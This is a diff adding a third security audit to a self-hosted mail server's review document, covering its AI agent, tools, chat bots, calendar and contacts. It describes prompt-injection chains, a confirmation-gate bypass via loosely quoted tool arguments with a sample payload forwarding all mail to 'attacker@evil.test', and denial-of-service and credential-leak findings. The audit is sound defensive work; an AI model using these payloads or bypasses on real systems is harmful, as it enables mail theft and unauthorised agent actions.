@@ -849,3 +849,235 @@ protocol implementations were reviewed against their specifications by
 reading, not by conformance suites. The findings above are what reading
 found; a fuzzer over `mailparse`, `dkim` and `dmarc` is the next thing
 worth doing.
+
+---
+
+# Third review
+
+- Date: 2026-09-13
+- Reviewed at: `main` at v0.21.0 (`a7170c2`); remediation begun in the same
+  branch
+- Status: third pass, over the whole program after the personal agent, its
+  tools, connected servers, skills, the browser and computer devices, the
+  address book with CardDAV, and the calendar with CalDAV and invitations by
+  mail
+
+Everything in that list was written after the second review and had never
+been audited. It roughly doubled the program, and it added a kind of
+surface the first two reviews did not have to think about: **a language
+model reading text written by strangers, holding tools that act as the
+person.** Six reviewers, one per surface, each asked to confirm a finding
+with a failing test or an exact trace before reporting it.
+
+## Summary
+
+Forty findings. The ones that mattered:
+
+- **The confirmation gate could be walked past by writing the tool call
+  sloppily** (SEC-48). Every risk decision read the arguments strictly and
+  fell back to the tool's own class when they would not parse; the tool then
+  decoded the same bytes through a repairing parser and acted. Single quotes
+  were enough to turn *outward* into *write* and skip the question.
+- **Handing out a credential was an ordinary write** (SEC-49). Minting a
+  full-account API token is not destructive and does not leave the server, so
+  it asked nobody — and the token came back in the answer.
+- **The fence around untrusted text was string concatenation** (SEC-50). A
+  message containing the closing tag ended it, and the rest was read as the
+  loop's own words.
+- **A linked group chat spoke with the owner's voice** (SEC-51). The chat was
+  the whole of the check; both bots already knew who had spoken and nothing
+  read it, so any member could drive the agent and answer its confirmations.
+- **Three unauthenticated ways to spend the server's memory or CPU from one
+  message** (SEC-52 to SEC-54), all measured: 16.4 seconds of a core from
+  repeated headers, 200,000 virus-scanner connections from a megabyte of
+  boundaries, 273 MB of heap from sixteen compressed report parts.
+- **A bot token, submission passwords and skill secrets written to places
+  that keep them** (SEC-55 to SEC-57) — a log, a database column that the
+  API returns, and a model provider's transcript.
+
+What is open at the end of this pass is listed in *Still open* below. The
+two items the second review left open are both still open, and one of them
+is slightly worse: the release pipeline now publishes a `latest` tag that
+the compose file consumes, and the workflow actions the second review asked
+to be pinned are still on mutable tags.
+
+## What was fixed in this pass
+
+### SEC-48 — The gate and the act read different bytes (High, fixed)
+
+`Tool.RiskFor` called `RiskOf` with the raw arguments. Every `RiskOf` in the
+catalog parses with `encoding/json` and returns the tool's base class when
+that fails. `DecodeArguments`, which the tool's own `Run` uses, repairs what a
+model mangles — fences, trailing commas, single quotes — through
+`llm.ExtractJSON`. So the question and the answer were asked of different
+text:
+
+    rule_add     strict "outward"     asks     loose "write"  asks nobody
+    token_manage strict "destructive" asks     loose "write"  asks nobody
+    shell        strict "destructive" asks     loose "write"  asks nobody
+
+`{'name':'x','conditions':[{'field':'any'}],'actions':[{'kind':'forward',
+'address':'attacker@evil.test'}]}` installs a standing forward of every
+arriving message, with no card shown. The same shape reached `calendar_add`
+with guests, `alias_add`, `skill install` and `shell`.
+
+Arguments are now settled once — `tools.SettledArguments` — and the gate
+judges what the tool will act on. `TestALooselyWrittenCallIsJudgedByWhatItDoes`
+fails against the old code with `"write"` where `"outward"` belongs.
+
+### SEC-49 — Handing out a way in was an ordinary write (High, fixed)
+
+`token_manage create` minted a token for the whole account, `RiskWrite`, with
+no declared permission and no confirmation; the plaintext came back in the
+tool's answer, which is kept in the run and sent to the model's provider.
+`app_password_manage create`, `credential_create`, `user_add`, `user_update`
+with groups, `group_manage` and `role_manage` were all the same class.
+
+They are not destructive — nothing is lost — and not outward — nothing leaves
+— which is exactly why they fell through: **what a credential costs is not
+what it changes, it is what somebody holding it can do afterwards.** There is
+now a fifth risk class, `granting`, which confirms like the other two.
+`TestHandingOutAWayInIsAskedAbout` covers all seven.
+
+### SEC-50 — Content could close the fence it was inside (High, fixed)
+
+Tool results, MCP answers, skill answers, tab and computer answers, compaction
+notes and tool *errors* are wrapped in `<untrusted-data>` … `</untrusted-data>`
+so the model reads them as data. The wrapping was `"<untrusted-data>\n" +
+content + "\n</untrusted-data>"`, and nothing between the spool and that line
+removes the closing tag. A message carrying it ended the fence; everything
+after read as the loop's own words. `fenced` now replaces the closing tag
+inside the content; `TestContentCannotCloseTheFenceItIsIn` asserts the fence
+closes once and closes last.
+
+### SEC-51 — A linked chat is a room, not a person (High, fixed)
+
+The only check on an incoming chat message was `incoming.ChatID ==
+channel.LinkedID`. `Incoming.SenderID` was filled in by both bots and read
+nowhere in the tree. In a linked group, any member — and anybody they invited
+— could address the bot and start a turn with the owner's permissions, and
+could answer a confirmation card, because the pending question belonged to the
+chat rather than to a person.
+
+The link now records who sent the code (migration 0059), and the bot answers
+that person alone. A bot linked before the column existed is refused with a
+message saying to link again, rather than trusted: a check that turns itself
+off for the rows that predate it is not a check.
+
+### SEC-52 — Quadratic header gathering in the spam rules (High, fixed)
+
+`newRuleSubjects` appended each repeat of a header name to the value already
+held, copying everything before it. A message may carry 4,096 headers of
+64 KiB; measured at 4,096 headers of 16 KiB, reading them took **16.4 seconds
+of one core**, from one message, from anybody who can reach port 25. It is the
+shape the second review fixed in `mailparse.Split`, in a file that pass did
+not open. Values are gathered and joined once, and the header block is built
+up to the bound rather than joined and then cut.
+
+### SEC-53 — Depth was bounded and breadth was not (High, fixed)
+
+`TraverseParts` capped nesting at 32 levels and never capped how many parts a
+message has. 1.4 MB of `--b` repeated is 200,000 parts, and the callers are
+what makes that expensive: the virus check opens a connection to clamd **per
+part**, so an ordinary-looking message became 200,000 connections, exhausted
+the scanner's pool, and — because a failed scan is logged and passed — left
+every other message unscanned while it ran. Parts are now capped at 1,000
+across the whole message.
+
+### SEC-55 — A bot token in the log, the database and the API (High, fixed)
+
+Telegram carries the bot token in the path of every request, and Go puts the
+whole URL in the error it makes when a request fails. After twenty-one
+consecutive failures the channel manager logs that error at `WARNING` **and**
+writes it to `agent_channel.last_error`, which the API returns and the command
+line prints. The token is sealed in that same table, which is the control this
+defeated. Nobody has to attack anything: a name that will not resolve is
+enough. The client now takes its own token out of any error it returns.
+
+### SEC-56 — `AUTH PLAIN <base64>` written to the debug log (Medium, fixed)
+
+`smtpd.readCommand` logged every verb and its argument; the single-line AUTH
+form, which is what nearly every client sends, carries the credential. Inbound
+that is a device's app password; outbound, `smtpc.sendCommand` logged the
+operator's relay password the same way. Both now say `AUTH <the credential>`.
+Debug is not the default level, but it is a field on the settings page, and
+this is the class SEC-1 fixed by removing a password from a debug line.
+
+### SEC-57 — A skill's secret in a transport error (Medium, fixed)
+
+A skill step may carry `{{secret:KEY}}` in its query string — the author
+chooses that — and a failed request returned Go's `*url.Error` with the whole
+URL in it. That becomes the tool's answer, which reaches the model's provider
+and the stored run. The two reports beside it already said only the host; this
+one now reports the host and the cause.
+
+## Still open
+
+Ranked, with what each needs. Nothing below is fixed in this pass.
+
+1. **A schedule launders injected text into a headless run holding the whole
+   catalog** (High). `schedule` is an unconfirmed write with no permissions;
+   the run it creates is headless with no allow list, and the stored prompt
+   arrives as the *user turn* — the highest-trust position — rather than as
+   marked data. Pairs with `account_update`, also unconfirmed, to change where
+   a scheduled answer is mailed.
+2. **The headless browser's address guard is a rebinding race** (High). The
+   guard resolves the name in Go and checks the addresses, then tells Chrome
+   to continue the request, and Chrome resolves again. Pin the checked address
+   instead.
+3. **The extension's DevTools refusal list is a blocklist with browser-wide
+   methods outside it** (High) — `Page.setDownloadBehavior` is not refused
+   while its `Browser.` twin is, and `cdp` is a write, so no card is shown.
+   Make it an allowlist and class `cdp` destructive.
+4. **A DAV listing is bounded in items, not bytes** (High). 10,000 cards of
+   1 MiB each, materialised whole, then serialised whole: the protocol library
+   has no streaming. A per-account byte ceiling at write time is the fix.
+5. **One message may carry unbounded DMARC aggregate reports** (High).
+   Measured: 273 MB of heap from a 1.2 MB message; ~16 GB at the default
+   message size. Needs a per-message budget across parts, and the domain
+   filter applied before decoding rather than after.
+6. **`Authentication-Results` forgery survives a chosen SNI** (Medium). The
+   set of "our own names" includes the SNI the client supplied, so a sender
+   who picks one keeps a forged header that names the real MX.
+7. **The out-of-office reply is aimed at an unverified envelope sender**
+   (Medium), and a DMARC pass on the header domain suppresses the SPF check on
+   the envelope. A reflector for signed mail, and a way to read an away
+   message from any stranger.
+8. **`settleZones` is quadratic**, ~1 CPU-second per 1 MiB file, and the
+   calendar part of a message is parsed *before* the DMARC check (Medium).
+9. **One refused app-password sign-in costs up to twenty bcrypts** (Medium),
+   and DAV re-runs the whole sign-in per request while only metering failures.
+10. **The IMAP listeners have no connection ceiling** (Medium) — the third
+    bullet of SEC-19, on the listener it was not applied to.
+11. **Calendar invitations send mail without `mail:send`** (Medium): every
+    other outbound path in the program checks it.
+12. **MCP OAuth discovery runs over an unguarded client** with no `https`
+    requirement and no issuer check (Medium), and a connected server may be
+    declared at an `http://` address with the person's token on it.
+13. **`user:manage` is transitively full administration** (Medium), and the
+    comment beside it says the opposite.
+14. **GraphQL takes a POST of any content type** (Medium): `SameSite=Lax` is
+    the only thing between a same-site page and a cookie-authenticated
+    mutation, and `/drawer` now allows framing.
+15. Smaller, recorded in full in the reviewers' reports: the shell rule asks
+    about `ssh` and not `curl`; a nil MCP client can panic a goroutine with no
+    recover; `secretish()` in the redaction test cannot see `token`,
+    `authorization` or `value`; `listen.debug` will bind anywhere; the
+    WebSocket CSRF check compares a cookie nothing sets; HSTS is never sent
+    behind a TLS-terminating proxy; ULIDs come from `math/rand`.
+
+Two functional defects were found by the same pass and belong with them: a
+`text/calendar` part is never transfer-decoded, so a base64 invitation — which
+is most of them — is silently unreadable; and an invitation between two
+mailboxes on this server is never acted on, because local delivery populates
+no DMARC result.
+
+## What this review did not do
+
+No fuzzing. No penetration test against a running instance. The prompt
+injection chains are traced through the code and confirmed at every gate they
+pass, but not demonstrated against a live model. The dashboard was read, not
+exercised. And the reviewers were told what is deliberate — the computer
+daemon is unconfined on the owner's own machine, app passwords authenticate
+over Basic, the administrator is trusted — so nothing below those lines was
+examined.
